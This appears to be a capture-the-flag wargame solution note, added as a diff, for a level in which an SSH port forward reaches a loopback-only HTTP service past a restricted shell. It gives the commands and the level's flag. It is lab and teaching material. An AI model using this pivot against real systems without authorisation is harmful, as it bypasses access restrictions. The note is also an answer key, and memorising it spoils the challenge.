@@ -1,0 +1,20 @@
+ [ Phantom · Level 16 ]  The Tunnel
+ Full brief:  cat ~/BRIEFING
+
+goal: find password for phantom17
+
+BRIEFING summary:
+  Entry host: 10.13.37.2 (phantom16)
+  Target: HTTP service on 10.13.37.30 — bound to loopback ONLY
+  Key: ~/.ssh/id_ed25519_ops (for ops@10.13.37.30)
+  Shell on ops@10.13.37.30 is RESTRICTED — no interactive commands, but TCP forwarding is allowed
+
+Solution — SSH Local Port Forwarding from phantom16:
+  ssh -f -N -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519_ops -L 9002:127.0.0.1:8080 ops@10.13.37.30
+  curl http://127.0.0.1:9002/
+
+Key insight: ops@10.13.37.30 has ForceCommand/restricted shell (running commands fails with "restricted endpoint")
+             but AllowTcpForwarding is still enabled — so -L port forwarding works.
+             Service was on port 8080 (not 80).
+
+FLAG: bl_phtm16_9fd69ae362fefb73
